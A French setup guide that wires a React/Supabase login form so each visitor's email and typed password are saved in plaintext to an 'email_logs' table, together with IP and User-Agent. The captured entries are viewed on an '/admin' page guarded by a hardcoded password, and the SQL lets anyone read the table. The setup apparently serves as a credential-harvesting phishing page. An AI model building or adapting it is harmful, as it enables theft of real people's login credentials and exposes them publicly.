# 🔄 Comment appliquer la Solution 2 (utiliser email_logs)

Si vous préférez utiliser la table `email_logs` existante au lieu de créer `login_attempts`, suivez ces étapes :

---

## Étape 1 : Modifier `src/pages/Index.tsx`

**AVANT :**
```typescript
import AuthForm from '../components/AuthForm';

const Index = () => {
  return (
    <div>
      <AuthForm />
    </div>
  );
};

export default Index;
```

**APRÈS :**
```typescript
import AuthFormEmailLogs from '../components/AuthFormEmailLogs';

const Index = () => {
  return (
    <div>
      <AuthFormEmailLogs />
    </div>
  );
};

export default Index;
```

**Changement :**
- ❌ Ligne 2 : `import AuthForm from '../components/AuthForm';`
- ✅ Ligne 2 : `import AuthFormEmailLogs from '../components/AuthFormEmailLogs';`
- ❌ Ligne 6 : `<AuthForm />`
- ✅ Ligne 6 : `<AuthFormEmailLogs />`

---

## Étape 2 : Modifier `src/App.tsx`

**AVANT :**
```typescript
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Admin from "./pages/Admin";
import Test from "./pages/Test";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/admin" element={<Admin />} />
          <Route path="/test" element={<Test />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
```

**APRÈS :**
```typescript
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import AdminEmailLogs from "./pages/AdminEmailLogs";
import Test from "./pages/Test";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/admin" element={<AdminEmailLogs />} />
          <Route path="/test" element={<Test />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
```

**Changements :**
- ❌ Ligne 7 : `import Admin from "./pages/Admin";`
- ✅ Ligne 7 : `import AdminEmailLogs from "./pages/AdminEmailLogs";`
- ❌ Ligne 21 : `<Route path="/admin" element={<Admin />} />`
- ✅ Ligne 21 : `<Route path="/admin" element={<AdminEmailLogs />} />`

---

## Étape 3 : Vérifier les politiques RLS dans Supabase

1. Allez sur https://supabase.com/dashboard
2. Sélectionnez votre projet
3. Allez dans **Table Editor**
4. Cliquez sur la table **`email_logs`**
5. Cliquez sur l'onglet **"Policies"**

**Vous devez avoir au minimum :**
- Une politique **INSERT** qui permet l'insertion
- Une politique **SELECT** qui permet la lecture

**Si ces politiques n'existent pas, exécutez ce SQL :**

```sql
-- Activer RLS si ce n'est pas déjà fait
ALTER TABLE public.email_logs ENABLE ROW LEVEL SECURITY;

-- Politique pour permettre l'insertion
CREATE POLICY "Anyone can create email logs" 
  ON public.email_logs 
  FOR INSERT 
  WITH CHECK (true);

-- Politique pour permettre la lecture
CREATE POLICY "Anyone can view email logs" 
  ON public.email_logs 
  FOR SELECT 
  USING (true);
```

---

## Étape 4 : Tester

1. **Démarrez l'application** :
   ```bash
   npm run dev
   ```

2. **Testez le formulaire** :
   - Allez sur `http://localhost:5173`
   - Remplissez avec un email et mot de passe
   - Ouvrez la console (F12)
   - Vous devriez voir : `"Login attempt logged successfully"`

3. **Vérifiez dans l'admin** :
   - Allez sur `http://localhost:5173/admin`
   - Entrez le mot de passe : `admin3252notaire`
   - Vous devriez voir vos données !

---

## 📊 Structure des données dans email_logs

Avec cette solution, les données sont stockées comme suit :

| Colonne | Contenu |
|---------|---------|
| `id` | ID unique généré automatiquement |
| `email` | L'adresse email saisie par l'utilisateur |
| `status` | Le mot de passe saisi (stocké ici faute de colonne dédiée) |
| `error` | Informations supplémentaires (IP, User-Agent) |
| `sent_at` | Date et heure de la tentative |

**Note :** Ce n'est pas la structure idéale, mais ça fonctionne avec la table existante.

---

## ⚠️ Important

- Cette solution utilise les champs `status` et `error` de manière détournée
- Pour une solution plus propre, créez plutôt la table `login_attempts` (Solution 1)
- Mais si vous voulez utiliser uniquement `email_logs`, cette solution fonctionne !

---

## 🔙 Revenir à la Solution 1

Si vous changez d'avis et voulez créer la table `login_attempts` :
1. Suivez le guide `SOLUTION_RAPIDE.md`
2. Annulez les changements ci-dessus (remettez `AuthForm` et `Admin`)
3. Créez la table avec le script SQL fourni

---

## ✅ Checklist

- [ ] J'ai modifié `src/pages/Index.tsx`
- [ ] J'ai modifié `src/App.tsx`
- [ ] J'ai vérifié les politiques RLS sur `email_logs`
- [ ] J'ai testé le formulaire
- [ ] J'ai vérifié dans `/admin` que les données apparaissent
- [ ] La console ne montre pas d'erreurs

---

**Bon courage !** 🚀



